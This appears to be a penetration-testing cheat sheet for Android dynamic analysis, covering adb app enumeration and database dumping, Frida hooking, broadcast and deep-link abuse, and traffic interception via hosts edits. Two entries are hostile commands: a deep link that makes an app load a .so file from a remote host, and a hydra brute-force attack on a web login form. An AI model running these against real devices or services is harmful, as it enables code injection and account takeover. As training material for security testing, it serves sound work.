# Android Application Dynamic Analysis


---
## Page 1

Enumerating and Exploiting Installed
Apps
Command
Description
adb connect 10.11.1.1:5001
Connect to the
remote device.
adb root
adb shell "dumpsys activity activities"
List the package
name of the
running apps.
adb root
adb shell
sqlite3
/data/data/com.hackthebox.myapp/databases/database.db
.tables
select * from tablname;
.exit
List the contents of
a database table
and exit.
adb shell am start -n com.hackthebox.myapp/.ActivityName -
-es filename "filename.txt"
Launch a specific
Android activity
with a parameter.
adb logcat '*:D' | grep 'Debug note: '
Read an app’s
debug log
messages and
filter the results.
ANDROID APPLICATION DYNAMIC
ANALYSIS
CHEAT SHEET

---
## Page 2

Command
Description
adb shell am force-stop com.hackthebox.myapp
Stop a running
application.
adb shell am start -W -a android.intent.action.VIEW -d
"app://myapp?url=http://192.168.5.8:8000/filename.so"
Initiate deep
linking by starting
an activity with an
intent to view a
specific URL.
Dynamic Code Instrumentation
Command
Description
brew install xz
unxz frida-server-16.1.11-android-arm64.xz
mv frida-server-16.1.11-android-arm64 frida-server
adb push frida-server /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &
Setting up
Frida server
on AVD
pip3 install frida-tools
pip3 install frida==16.1.11
frida -U -l snippet.js -f com.example.myapp
Hook a Java
method using
Frida.
adb shell am broadcast -a "android.intent.action.BATTERY_LOW"
--es "Is_on" "yes"
Send a
broadcast with
a custom
action and
extra data.
curl -X POST -d "username=user&password=user"
http://192.168.5.13/login.php
Send a POST
request with
form data to a
specified URL.

---
## Page 3

Command
Description
hydra -L /usr/share/wordlists/rockyou.txt -p test 192.168.5.13
http-post-form
'/login.php:anchor=^^&username=^USER^&password=^PASS^:F=Wrong
username.' -v
Perform a
brute-force
login attack,
attempting
usernames
from a
specified list
with a fixed
password,
against a web
form.
apt install gridsite-clients
urlencode "HvjC9ylN6MwigL/l2HiFtw=="
Encode a
string for safe
web
transmission.
Intercepting HTTP/HTTPS Requests
Command
Description
adb uninstall myapp.apk
Uninstall apps.
/pat/to/Android/sdk/emulator/emulator -avd
Pixel_3a_API_34 -netdelay none -netspeed full -
dns-server 8.8.8.8 -writable-system
Start an Android Virtual
Device (AVD) with a writable
system.
adb root
adb remount
adb shell mount -o rw,remount /system
adb shell 'echo "192.168.5.183 www.chatapp.com"
>> /system/etc/hosts'
adb shell mount -o ro,remount /system
adb shell reboot
Edit the hosts file in an AVD
echo "192.168.1.183 www.example.com" | sudo tee
-a /etc/hosts > /dev/null
Configure our host machine's
/etc/hosts file to map the
domain name
www.example.com to the
server's IP address.

---
## Page 4

Command
Description
adb install ./myapp.apk
adb uninstall com.hackthebox.myapp
Install and uninstall apps
using ADB.